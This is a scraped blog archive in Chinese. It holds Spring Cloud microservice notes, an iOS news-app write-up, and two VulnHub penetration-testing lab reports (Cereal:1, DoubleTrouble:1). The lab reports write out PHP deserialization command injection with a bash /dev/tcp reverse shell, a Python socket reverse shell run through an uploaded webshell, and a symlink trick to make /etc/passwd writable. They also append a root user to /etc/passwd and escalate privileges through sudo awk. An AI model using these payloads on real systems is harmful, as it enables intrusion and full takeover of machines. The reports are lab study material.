&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-loadbalancer&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-loadbalancer&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt; 在 bootstrap 中配置 nacos 的访问地址： 在程序入口处（主类 SpringCloudApplication）添加注解： @EnableDiscorveryClient 使用 feign 方式调用远程服务，在启动类上添加注解： @EnableFeignClients 定义 feign 接口。 调用服务的三种方式* Spring DiscoveryClient 使用支持 LoadBalanced 的 RestTemplate 使用OpenFeign（@FeignClient） OpenFeign是一款声明式、模板化的HTTP客户端， Feign可以帮助我们更快捷、优雅地调用HTTP API。 后两者均支持负载均衡。 有用的命令 查看日志：kubectl logs -f -l app&#x3D;organizationservice –all-containers&#x3D;true （将相同服务的日志集中输出） 重部署：kubectl rollout restart deployment organizationservice 扩容：kubectl scale deployment organizationservice –replicas 5 Feign 方式访问* 把远程服务的访问抽象成本地方法的调用 添加注解 @EnableFeignClients； 定义访问接口： @FeignClient(&quot;服务名&quot;) 使用 @Autowired 注入 bean； 负载均衡的策略 roundLoadBalancer randomLoadBalancer @LoadBalancerClient(name &#x3D; “organizationservice”, configuration &#x3D; Application.class) 对第二、三种调用都有效 健康检查* 临时实例的客户端主动上报机制，临时实例每隔 5s 发送一个心跳包给 Nacos 服务器端。（大部分情况） 永久实例的服务端反向探测机制，永久实例支持 3 种探测协议，TCP、HTTP 和 MySQL，默认探测协议为 TCP，也就是通过不断 ping 的方式来判断实例是否健康。（IP 地址不变，nacos 可以主动探测） nacos 的 service 与 kubernetes 的 service 的异同点共同点：通过服务名来访问服务，一个服务名的背后可能有多个动态的实例； 不同点： kubernetes 中的服务（实现级别的）是 pod 层级的，与 k8s 中的其他资源配合使用； nacos 中的服务（概念性的）是服务层级的，是与开发框架相关的： 微服务开发之前没有 k8s 也可以使用 spring cloud 定义多个微服务。 定义了 nacos 的 service 之后就没必要定义 k8s 中的 service 了。 *客户端只是从 nacos 服务器获取目标服务的信息，实际与目标服务通信并不需要 nacos 进行转发。 十三、基于 Sentinel 的流控与熔断 Sentinel、Nacos 什么是流控与熔断 避免雪崩效应：一级一级拖垮系统效率 流控： 如果客户端发出的请求过多导致服务端不能及时处理（A到B的请求被称为流量），限制A到B的流量，超过一定的数量服务端就不作处理。避免服务端高负荷工作和对某个客户端请求的处理时间过长。 容错： 需要一个错误处理服务器对服务抛出的错误进行处理。 熔断： 如果客户端发往服务端的每一个请求响应都非常慢，则可以认为服务端正在高负荷运转或内部已经出现了错误，此时客户端就不会再等到该服务端的请求，或不再将请求发往该服务端，直接认为该服务出错。 Sentinel控制台不需要我们进行开发，我们只需要针对核心库进行开发。 控制台不负责维护规则，规则从服务中查来； 服务挂，规则丢； 控制台定义的规则直接应用到服务上。 定义资源 -&gt; 定义规则 -&gt; 查看效果 定义资源 代码直接定义； 使用注解定义； 基于 Spring Cloud 针对 url 自动定义。 外置的文件只能用于定义规则而不能用于定义资源。 规则的种类 流量控制规则； 熔断降级规则； 系统保护规则； 来源访问控制规则； 热点参数规则。 熔断策略慢调用比例； 异常比例； 异常数。","categories":[{"name":"服务端开发","slug":"服务端开发","permalink":"http://blog.kekwy.com/categories/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"软件工程","slug":"软件工程","permalink":"http://blog.kekwy.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"},{"name":"Spring","slug":"Spring","permalink":"http://blog.kekwy.com/tags/Spring/"},{"name":"后端","slug":"后端","permalink":"http://blog.kekwy.com/tags/%E5%90%8E%E7%AB%AF/"}],"author":"Ke_DiWZ"},{"title":"【iOS开发】IW2 新闻APP","slug":"iw2-newsapp","date":"2022-11-28T10:02:55.000Z","updated":"2023-01-28T10:03:25.388Z","comments":true,"path":"iw2-newsapp/","link":"","permalink":"http://blog.kekwy.com/iw2-newsapp/","excerpt":"","text":"&#x6b;&#101;&#101;&#x6b;&#x6b;&#101;&#x77;&#x79;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d; 简介 功能介绍 展示视频 技术实现 视图结构 内容目录页 目录内容抓取 目录内容显示 下拉和上拉刷新 界面跳转 文章详情页 内容加载 导航栏的隐藏和显示 关于我们页 感谢评阅 简介功能介绍该APP是为学校信息中心（ITSC）官网设计的一个新闻客户端，包含“新闻动态”、”通知公告“、”信息化动态“、“安全公告”、“关于我们”五个板块，实时从官网上抓取新闻，支持上拉刷新，下拉加载新内容，异步加载图片和对图片、文字进行本地缓存等功能。 展示视频 技术实现视图结构 内容目录页 每个板块使用 TableView 组织内容，没个 cell 展示一则新闻的标题和发布时间。用户点击 cell 时根据此时 cell中的内容跳转至对应新闻的详情页。 目录内容抓取初始化 url 在目录页的 TableViewController 初始化时，根据该页面导航栏的标题设置该页面板块所对应的 url 前缀。 1234567891011121314151617181920required init?(coder: NSCoder) &#123; url = &quot;&quot; receivedData = Data() super.init(coder: coder) switch(navigationItem.title) &#123; case &quot;新闻动态&quot;: url = &quot;https://itsc.nju.edu.cn/xwdt/list&quot; break case &quot;通知公告&quot;: url = &quot;https://itsc.nju.edu.cn/tzgg/list&quot; break case &quot;信息化动态&quot;: url = &quot;https://itsc.nju.edu.cn/wlyxqk/list&quot; break case &quot;安全公告&quot;: url = &quot;https://itsc.nju.edu.cn/aqtg/list&quot; break default: break &#125;&#125; 发送 url 请求 定义 session 用于发送和处理网络请求： 12345678private lazy var session: URLSession = &#123; let configuration = URLSessionConfiguration.default configuration.waitsForConnectivity = true configuration.timeoutIntervalForResource = 300 // 将缓存策略设置为从不使用缓存 configuration.requestCachePolicy = .reloadIgnoringLocalCacheData return URLSession(configuration: configuration, delegate: self, delegateQueue: nil)&#125;() 由于每次启动 APP 时应获取实时的新闻列表，故此处将 session 设置为不使用缓存。 将 url 前缀后直接加上 “.htm” 组成 itsc 对应板块文章列表第一页的 url 地址，在后台线程队列 requestQueue 中发起 urlRequest： 123456requestQueue.async &#123; let curUrl = URL(string: self.url + &quot;.htm&quot;) let task = self.session.dataTask(with: URLRequest(url: curUrl!)) self.refreshTaskId = task.taskIdentifier task.resume()&#125; 处理返回结果 在定义 session 时将当前 ViewController 设置为了其代理，故在当前 ViewController 中实现代理方法，并定义 receivedData 变量储存返回内容直到回复内容全部返回： 12345678910111213var receivedData: Datafunc urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void) &#123; ...&#125; func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data) &#123; self.receivedData.append(data)&#125; func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) &#123; ...&#125; 使用 scanner 根据 itsc 官网源码的格式对得到的 html 代码进行解析，从中获取每条新闻的标题、日期、正文 url以及建立三者的对应关系。 1234let string = String(data: self.receivedData, encoding: .utf8)let contentScanner = Scanner(string: string!)_ = contentScanner.scanUpToString(&quot;&lt;div id=\\&quot;wp_news_w6\\&quot;&gt;&quot;)... 目录内容显示自定义 TableViewCell 自定义 ArticleTableViewCell 类，并在 TableViewController 中注册： 1self.tableView.register(ArticleTableViewCell.self, forCellReuseIdentifier: &quot;myCell&quot;) ArticleTableViewCell 中包含两个 UILabel，一个用于显示文章标题，另一个用于显示文章日期，还有一个字符串变量保存该文章的正文 url。 其中的所有控件在初始化时通过代码设置约束，每一个 cell 在加载标题前拥有默认高度，成功设置文章标题后其高度跟随标题 UILabel。 设置 cell 内容 在 TableViewController 中实现代理方法： 12345678override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell &#123; let cell = tableView.dequeueReusableCell(withIdentifier: &quot;myCell&quot;, for: indexPath) if indexPath.row &lt; self.cellData.count &#123; let text = cellData[indexPath.row] (cell as! ArticleTableViewCell).setContent(link: text[0], title: text[1], date: text[2]) &#125; return cell&#125; 使用此前注册的信息创建一个 cell，根据即将显示的 cell 所在的行号获取对应的数据，并对其内容进行设置。 在 TableViewController 定义变量 cellData： 1private var cellData: [[String]] = [] 其为一个字符串的二维数组，每一行对应 tableView 中相同行数的 cell 的数据，每一列分别对应：正文 url、文章标题、文章日期。 下拉和上拉刷新 使用了 Github 上开源的包：MJRefresh 创建变量 header、footer： 12private let header = MJRefreshNormalHeader() // 顶部刷新private let footer = MJRefreshAutoNormalFooter() // 底部刷新 将其部署到视图中并设置事件响应方法： 12header.setRefreshingTarget(self, refreshingAction: #selector(pullRefresh))footer.setRefreshingTarget(self, refreshingAction: #selector(pullMore)) 在方法 pullRefresh 中将重复上文所述的请求目录第一页的操作，并将现有数据清空。 在方法 pullMore 中将请求下一页的目录信息，并将结果追加在现有数据之后，即实现用户下拉加载更多内容： 1234567891011requestQueue.async &#123; // 将当前页数加一 let pageNum: Int = self.pageNum + 1 // url 前缀 + 页号 + .htm 即为该板块对应页的 url let curUrl = URL(string: self.url + String(pageNum) + &quot;.htm&quot;) let task = self.session.dataTask(with: URLRequest(url: curUrl!)) self.pullMoreTaskId = task.taskIdentifier task.resume() // 更新当前页号 self.pageNum = pageNum&#125; 界面跳转1234567891011// UITableViewDelegate 方法，处理列表项的选中事件override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) &#123; self.performSegue(withIdentifier: &quot;ShowDetailView&quot;, sender: self.tableView.cellForRow(at: indexPath))&#125;//在这个方法中给新页面传递参数override func prepare(for segue: UIStoryboardSegue, sender: Any?) &#123; if segue.identifier == &quot;ShowDetailView&quot;&#123; (segue.destination as! ArticleViewController).url = URL(string: &quot;https://itsc.nju.edu.cn&quot; + (sender as! ArticleTableViewCell).link) &#125;&#125; 文章详情页 使用 scrollView 展示文章内容 在 ScrollView 中放置一个空白的 View，其高度跟随自身 y 值最大的子控件的 maxY。加载文章正文时涉及的控件作为子控件加入该 View 即可。 内容加载使用缓存 定义 session： 12345678private lazy var session: URLSession = &#123; let configuration = URLSessionConfiguration.default configuration.waitsForConnectivity = true configuration.timeoutIntervalForResource = 300 // 优先使用缓存，在缓存中找不到再重新通过网络加载 configuration.requestCachePolicy = .returnCacheDataElseLoad return URLSession(configuration: configuration, delegate: self, delegateQueue: nil)&#125;() 与之前不同的是，对于已经发布的新闻文章我们可以在第一次加载时将其保存在本地，之后都从本地加载文章内容，直到用户清除缓存。 加入子控件 同样使用 scanner 对 html 代码进行解析，根据 itsc 文章正文 html 代码的特征解析出文章标题、正文、图像 url，再根据不同的内容类型生成相应的子控件并设置约束。 所有的子控件根据其对应内容在正文代码中的顺序从上到下依次排列，每次加入子控件时都需要根据上一个加入的控件设置其 topAnchor 的约束，并将“上一个加入的子控件”更新为当前加入的控件。 contentView 的高度约束根据最后一个加入的子控件的 bottomAnchor 设置。 异步加载 其中在加入图片时，还需要对每个图片进行一次 url 请求，如果在主线程中阻塞等待其结果，则会造成界面卡顿，故我们在这里使用异步加载思路。 在进行图像的 url 请求时，先在 imageView 中添加一个活动指示器，令其播放“转圈”的加载动画： 123456let indicator = UIActivityIndicatorView()imageView.addSubview(indicator)indicator.translatesAutoresizingMaskIntoConstraints = falseindicator.startAnimating()indicator.centerXAnchor.constraint(equalTo: imageView.centerXAnchor).isActive = trueindicator.centerYAnchor.constraint(equalTo: imageView.centerYAnchor).isActive = true 再通过 DispatchQueue 的异步执行发送 url 请求，和处理响应内容。 在成功接收到图像数据后，停止加载动画，并根据图片缩放后的高度更新 imageView 的高度约束。 12345678910// 停止加载动画indicator.stopAnimating()// 移除活动指示器indicator.removeFromSuperview()// 更新 imageView 的高度约束for constraint in imageView.constraints &#123; if constraint.firstAnchor == imageView.heightAnchor &#123; constraint.constant = image.size.height * ( self.contentView.frame.width - 32) / (image.size.width) &#125;&#125; 导航栏的隐藏和显示实现 scrollView 的代理方法： 1234567891011121314151617func scrollViewDidScroll(_ scrollView: UIScrollView) &#123; let pan = scrollView.panGestureRecognizer let velocity = pan.velocity(in: scrollView).y // 用户向下划屏幕时显示导航栏 if velocity &lt; -10 &#123; self.navigationController?.setNavigationBarHidden(true, animated: true) statusBarStyle = .darkContent setNeedsStatusBarAppearanceUpdate() // 用户向上划屏幕时隐藏导航栏 &#125; else if velocity &gt; 10 &#123; self.navigationController?.setNavigationBarHidden(false, animated: true) statusBarStyle = .lightContent setNeedsStatusBarAppearanceUpdate() &#125;&#125; 由于我们的 APP 导航栏的颜色为“南大紫”，导航栏存在时系统状态栏的颜色是白色，而正文背景是白色，故在导航栏隐藏后，应将系统状态栏颜色改为黑色并刷新。 关于我们页点击按钮清除缓存： 12345678@IBAction func showAlert(_ sender: Any) &#123; let alert = UIAlertController(title: &quot;清除缓存&quot;, message: &quot;清除缓存后相应的内容将会在设备联网时重新加载，这将消耗一定的流量。您确定要清除缓存吗？&quot;, preferredStyle: .alert) alert.addAction(UIAlertAction(title: &quot;确定&quot;, style: .default, handler: &#123;_ in URLCache.shared.removeAllCachedResponses() &#125;)) alert.addAction(UIAlertAction(title: &quot;取消&quot;, style: .default, handler: nil)) self.present(alert, animated: true, completion: nil)&#125; 【感谢评阅】","categories":[{"name":"iOS智能应用开发","slug":"iOS智能应用开发","permalink":"http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"开发","slug":"开发","permalink":"http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"iOS","slug":"iOS","permalink":"http://blog.kekwy.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://blog.kekwy.com/tags/Xcode/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第十周 vulnhub-Cereal:1","slug":"vulnhub-Cereal","date":"2022-11-26T07:59:32.000Z","updated":"2022-11-26T08:07:41.195Z","comments":true,"path":"vulnhub-Cereal/","link":"","permalink":"http://blog.kekwy.com/vulnhub-Cereal/","excerpt":"","text":"网络攻防实战 第十次实验 邮箱：&#107;&#101;&#x65;&#x6b;&#107;&#101;&#119;&#121;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109; 2022年11月26日 靶机链接：https://vulnhub.com/entry/cereal-1,703/ 一、实验目的获取靶机 root 权限和一个 root flag。 我们将使用以下攻击手段： 主机发现、端口扫描； 隐藏路径爆破； 域名绑定 IP； 隐藏域名爆破； 隐藏文件爆破； 解析 PHP 对象序列并进行命令注入； 反弹 shell； 利用 pspy 工具查看靶机上运行的所有进程； 通过链接文件利用靶机漏洞； 自定义 root 用户； 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.17 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12sudo arp-scan -I eth0 -lsudo nmap -p- 10.0.2.17 发现开启了许多端口，经过对各个端口进行简单尝试之后。考虑从 80 端口寻找突破口。 访问 80 端口发现是一个 Apache 的默认页面，查看源码也并没有直接可利用的信息： 尝试进行隐藏路径爆破： 1dirsearch -u http://10.0.2.17 访问 http://10.0.2.17/blog，发现了一个没有样式的页面，疑似与某一域名有关： 同时发现该网页是由 WordPress 支持的。 技巧：访问网页时出现卡顿，然后看到没有加载样式的网页，可推测是 CSS 加载失败，进而寻找是否需要将某一个域名的 IP 加入 hosts 文件中。 对 &#x2F;blog 路径进行进一步的路径爆破： 1dirsearch -u http://10.0.2.17/blog/ 发现目录 wp-admin，并且发现该目录被重定向到了我们刚才发现的那个域名。 尝试在 hosts 文件中加入记录 10.0.2.17 cereal.ctf 将该域名与靶机的 IP 地址对应。 123/etc/hosts:...10.0.2.17 cereal.ctf 重新访问 blog 页面，发现成功加载了样式： 在 80 端口的 web 应用继续进行信息收集，未发现明显的有效信息。 尝试从 4441 端口（同样运行着一个 web 应用）继续寻找突破口： 直接访问发现只有一行文本内容。 0x01. 服务器域名爆破 联想到某些服务器可能会根据 HTTP 请求中 HOST 头的不同，为用户返回不同的页面。尝试使用 gobuster 对靶机 44441 端口进行域名爆破： 1gobuster vhost -u http://cereal.ctf:44441 --append-domain -w fierce_hostlist.txt 字典文件在 kali 上的路径为：&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;fierce_hostlist.txt 成功扫描出一个域名：secure.cereal.ctf 将该域名与靶机 IP 关联并添加记录到 kali 的 host 文件中，浏览器访问 http://secure.cereal.ctf:44441/： 发现当前页面可以对指定的 IP 进行 ping 操作，输入 kali 本机的 IP，查看结果： 发现确实执行了 ping 操作，查看结果发现与系统命令中的 ping 操作返回结果格式相似，推测此处调用了系统指令，尝试进行命令注入。 0x02. 命令注入 尝试直接注入未果，使用 burp suite 拦截当前页面点击 ping 按钮之后的请求： 发现请求体比较可疑。 在 burp suite 中选中请求体中 obj 字段的值，进行解码： 得到了解码结果，猜测是一个经过 php 序列化编码之后的对象数据格式。在请求头中的数据已经进行了序列化，可以推测该编码操作是网页中的脚本代码负责完成的。 查看相关的网页源码： 123456789&lt;script&gt;function submit_form() &#123; var object = serialize(&#123;ipAddress: document.forms[&quot;ipform&quot;].ip.value&#125;); object = object.substr(object.indexOf(&quot;&#123;&quot;),object.length); object = &quot;O:8:\\&quot;pingTest\\&quot;:1:&quot; + object; document.forms[&quot;ipform&quot;].obj.value = object; document.getElementById(&#x27;ipform&#x27;).submit();&#125;&lt;/script&gt; 但是由于不知道服务器程序对该对象序列的处理流程，无法判断出直接有效的注入方式。联想到 blog 页面提示“尝试从备份中恢复”，猜测靶机上可能存在服务程序的备份文件，尝试通过隐藏文件爆破进行寻找。 “We are in the process of restoring from our backups” 0x03. 隐藏文件爆破 使用 kali 自带的 DirBuster 工具进行爆破： 最终发现路径：/back_en 继续对 &#x2F;back_en 下的文件进行爆破，由于是备份文件，猜测文件名后缀为 .bak： 发现备份文件 index.php.bak。 将查找到的备份文件下载到 kali： 1wget http://secure.cereal.ctf:44441/back_en/index.php.bak 查看内容猜测是 ping 页面的后台程序源码，并找到与 ping 功能相关的代码： 12345678910111213141516171819202122232425262728293031323334class pingTest &#123; public $ipAddress = &quot;127.0.0.1&quot;; public $isValid = False; public $output = &quot;&quot;; function validate() &#123; // 如果当前对象中的 isValid 值不为 True if (!$this-&gt;isValid) &#123; // 进行了某种过滤 if (filter_var($this-&gt;ipAddress, FILTER_VALIDATE_IP)) &#123; // 测试通过才会执行代码 $this-&gt;isValid = True; &#125; &#125; $this-&gt;ping(); &#125; public function ping() &#123; if ($this-&gt;isValid) &#123; // 指令的执行方式 $this-&gt;output = shell_exec(&quot;ping -c 3 $this-&gt;ipAddress&quot;); &#125; &#125;&#125;if (isset($_POST[&#x27;obj&#x27;])) &#123; $pingTest = unserialize(urldecode($_POST[&#x27;obj&#x27;]));&#125; else &#123; $pingTest = new pingTest;&#125;$pingTest-&gt;validate(); 通过对上述代码进行简单的分析，我们发现只需要我们上传的序列化对象中的 isValid 值本身为 True，就可以绕过服务端对 ipAddress 字段合法性的检测，最终导致靶机执行我们所注入的命令。 0x04. 继续命令注入 简单学习 PHP 对象序列的格式之后，对此前解码获得的对象序列进行分析： O : 8 : &quot;pingTest&quot; : 1 : &#123;s : 9 : &quot;ipAddress&quot;; s : 9 : &quot;127.0.0.1&quot;; &#125; o：object，表示对象类型； 8：表示其后的字符串长度为8； “pingTest”：表示当前对象为类 pingTest 的一个对象； 1：表示其后包含1个该对象的属性，花括号中的内容即为对象的属性； s：string，表示字符串类型； 9：其后的字符串长度； “ipAddress”：属性的名称； “127.0.0.1”：”ipAddress”属性的值； 参考：PHP序列化和反序列化 可见请求体中发送给服务器的对象仅包含了 ipAddress 这个一个属性，为了绕过服务端的检测，需要添加 isValid 属性且将其赋值为 True。构造对象序列如下： O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:9:&quot;127.0.0.1&quot;;s:7:&quot;isValid&quot;;b:1;&#125; 加入属性 s:7:&quot;isValid&quot;;b:1; 。 其中，分析服务端代码得知，我们可以将需要注入的命令包含在 ipAddress 的值中，最终修改序列如下： O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:14:&quot;127.0.0.1 &amp; id&quot;;s:7:&quot;isValid&quot;;b:1;&#125; 在 burp suite 中用上述注入序列替换原始的对象序列，编码后发送： 发现除了 ping 的结果，我们还收到了注入命令的执行结果： 尝试使用如下命令获取反弹 shell： 1bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1 构造注入序列： O:8:&quot;pingTest&quot;:2:&#123;s:9:&quot;ipAddress&quot;;s:40:&quot;&amp;bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1&quot;;s:7:&quot;isValid&quot;;b:1;&#125; 在 kali 上监听 4444 端口，执行注入命令，成功获取反弹 shell： 0x05. 本地漏洞提权 利用 pspy 工具检测靶机上正在运行的进程： 发现存在一个以 root 身份运行某个 shell 脚本的进程。 pspy 工具：https://github.com/DominicBreuker/pspy 查看该脚本内容; 1chown rocky:apache /home/rocky/public_html/* 发现是将 /home/rocky/public_html/* 目录下的所有文件所有者更改为当前用户，猜测若在该目录下创建一个 passwd 文件的链接文件，会导致脚本执行时将 passwd 文件的所有者一并更改为当前用户，从而获取对 passwd 文件的写入权限。 使用 ln 命令将 passwd 文件链接到该目录下： 1ln -s /etc/passwd /home/rocky/public_html/111111 等待片刻后查看 passwd 文件的权限： 1ls -l /etc/passwd -rwxrwxr-x. 1 root root 1549 May 29 2021 /etc/passwd 发现文件权限成功被修改。 再次使用 实验八 中自定义 root 用户的方式，插入一条 root 权限的用户记录： 1echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd 切换至该自定义用户，成功提权： 0x06. 最终的信息收集 尝试使用 ssh 以自定义 root 用户身份登入靶机： 1ssh test123@10.0.2.17 成功登入后查看当前目录下的文件： 查看文件 proof.txt 得到 flag：1aeb5db4e979543cb807cfd90df77763 查看文件 listener.sh： 12345678910nc -k -l 139 &amp;nc -k -l 445 &amp;nc -k -l 11111 &amp;nc -k -l 22222 &amp;nc -k -l 22223 &amp;nc -k -l 33333 &amp;nc -k -l 33334 &amp;nc -k -l 44444 &amp;nc -k -l 55555 &amp;nc -k -l 55551 发现是一段 shell 脚本，通过 nc 命令监听了很多端口。 推测这就是我们之前 nmap 扫描出来很多端口，但是无法确定其上所运行服务的原因——这些端口仅被监听，实际上并没有运行有效的服务。 五、实验结果root 权限： 任务一：点击跳转； 任务二：点击跳转； 任务三：点击跳转。 四、总结 本次实验靶机开发的端口很多，需要从扫描到的端口中寻找突破口。首先关注提供 web 应用的端口。 浏览器访问 80 端口，未发现有效信息，进行路径爆破发现 /blog 路径，访问路径发现一个未加载样式的网页，并获得提示——靶机上存在某个服务端的备份文件。 对 /blog 路径进行进一步爆破，发现某些路径被重定向到了某个域名的子路径上，尝试在 kali 的 hosts 文件中将该域名与靶机 IP 绑定。再次访问 /blog 路径，发现成功加载了样式。 浏览器访问靶机 44441 端口，发现没有有效信息。对该端口进行域名爆破，发现一个隐藏的域名，同样将该域名与靶机 IP 进行绑定。再次访问后，发现当前页面可以对用户输入的 IP 地址进行 ping 操作。联想到命令注入。 简单尝试注入后未果，拦截 ping 操作时发往服务器的请求头。发现网页将用户输入的 IP 地址包装成了一个对象，并做了序列化操作。但由于不知道服务端解析对象的方式，故无法直接进行命令注入。 联想到 80 端口 /blog 路径下的提示，尝试通过路径、文件爆破寻找靶机上的备份文件。 找到备份文件后，下载至 kali 查看，推测是 ping 操作页面服务端的源码。根据该源码中的对象解析方式，构造注入对象的序列，实现合法性绕过以及命令的注入，最终成功获取反弹 shell。 使用 pspy 工具查看靶机上运行的进程，找到一个以 root 身份运行的 shell 脚本进程。查看相关脚本，发现该脚本将指定目录下的所有文件的所有者更改为了反弹 shell 中的当前用户。 尝试在该目录下建立 passwd 文件的链接，使该脚本更改 passwd 文件的所有者，最终获取对 passwd 文件的写入权限。 使用与实验八相同的操作自定义一条 root 用户记录，并插入 passwd 文件。 切换至自定义用户，完成提权！ ps：实验报告中只展示了成功的思路，但是在实际的渗透测试中，往往需要我们对多个漏洞点进行尝试，才能找到有效的突破口。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第九周 vulnhub-DoubleTrouble:1","slug":"vulnhub-doubletrouble","date":"2022-11-15T16:46:45.000Z","updated":"2022-11-26T07:58:34.612Z","comments":true,"path":"vulnhub-doubletrouble/","link":"","permalink":"http://blog.kekwy.com/vulnhub-doubletrouble/","excerpt":"","text":"网络攻防实战 第九次实验 邮箱：&#x6b;&#x65;&#101;&#107;&#107;&#101;&#119;&#x79;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109; 靶机链接：https://www.vulnhub.com/entry/doubletrouble-1,743/ 2022年11月15日 一、实验目的本次的靶机比较特别，在获取第一个靶机的 root 权限后会在 root 主目录下发下另一个靶机的 .ova 文件，我们还需要将其下载到宿主机，继续尝试渗透。最终取得两个靶机的 root 权限以及第二个靶机上的两个 flag。 我们将使用到以下攻击手段： 主机发现； 端口扫描； 隐藏路径爆破； 隐写数据破解； 文件上传漏洞； 一句话木马脚本； 反弹 shell； awk 提权； sql基于时间的盲注（使用sqlmap）； 脏牛漏洞提权。 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.14、10.0.2.16 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12sudo arp-scan -I eth0 -lsudo nmap -p- 10.0.2.14 -A 访问80端口发现是一个登录界面，查看源码也并没有直接可利用的信息： 尝试直接输入单引号触发报错寻找注入点，也没有结果。 （使用 BurpSuite 拦截请求，发现我们输入的单引号在发送前被进行了转义，但重新修改为单引号后发送，同样没有收到报错信息） 0x01. 隐藏路径爆破 首先想到查找隐藏路径： 1dirsearch -u http://10.0.2.14 找到了隐藏路径 /secret/ ，根据此前实验的经验，我们第一时间查看其内容。 访问上述目录，发现只包含一张图片： 既然其处于 /secret/ 目录下，猜测其中包含隐写入的信息。 将其保存至 kali，使用 stegseek 工具进行破解： 安装：$ sudo apt install stegseek 仓库：https://github.com/RickdeJager/stegseek 1stegseek doubletrouble.jpg rockyou.txt 其中 rockyou.txt 字典可以通过 locate 命令在 kali 上找到。 生成了输出文件 doubletrouble.jpg.out，查看破解结果，发现疑似此前网站主页的登录邮箱和密码。 12otisrush@localhost.comotis666 尝试登录，成功跳转至下级界面： 0x02. 文件上传漏洞 浏览各个界面，优先关注文件上传点： 首先发现可以通过网页右上角进入用户的 My Details 界面，其中可以进行用户的头像的上传，但是先尝试上传一个普通图片后，发现该功能存在 bug，上传失败。 返回主页后在左侧菜单栏访问目录 Tools-&gt;Import Tasks from XLS file ，发现第二个文件上传点，但是上传之后，同样触发错误： 最终在左侧菜单栏 Configuration-&gt;General-&gt;General 界面发现有效的文件上传点。 浏览 Configuration-&gt;General-&gt;General 界面，发现可以进行文件上传，推测可能是用于设置该网站应用的 logo： 选择任意图片尝试上传后，发现当前页面左上角发生变化，变为了我们刚才选择的图片： 说明此处的文件上传功能确实有效可用。 尝试直接上传我们祖传的一句话木马文件，发现上传失败，推测需要进行文件类型检测的绕过。 在此尝试上传，并使用 BurpSuite 截获我们的请求，修改我们所上传文件的信息： 使用此前实验中用过的方法，在文件内容开头加入 GIF89a 进行文件内容欺诈。 发现左上角的内容发生变化，变为一张显示错误的图片。右键选择新建标签页打开图片，获取图片对应文件的 url： 显然我们的一句话木马文件上传成功，测试一下： 到此为止，我们就可以和之前一样，通过一句话木马执行反弹 shell 脚本： 12http://10.0.2.14/uploads/script.php?cmd=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.15&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 成功获取反弹 shell，使用以下指令进行提升： 1python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 0x03. 利用 awk 提权 查看当前用户不使用密码就可以通过 sudo 执行的命令： 1sudo -l 发现可以不使用密码通过 sudo 执行 awk 命令。 前往提权指令汇总网站 GTFOBins 查找 awk 命令： 选择 Shell 查看 Shell 提权的命令： 1sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27; 在反弹 shell 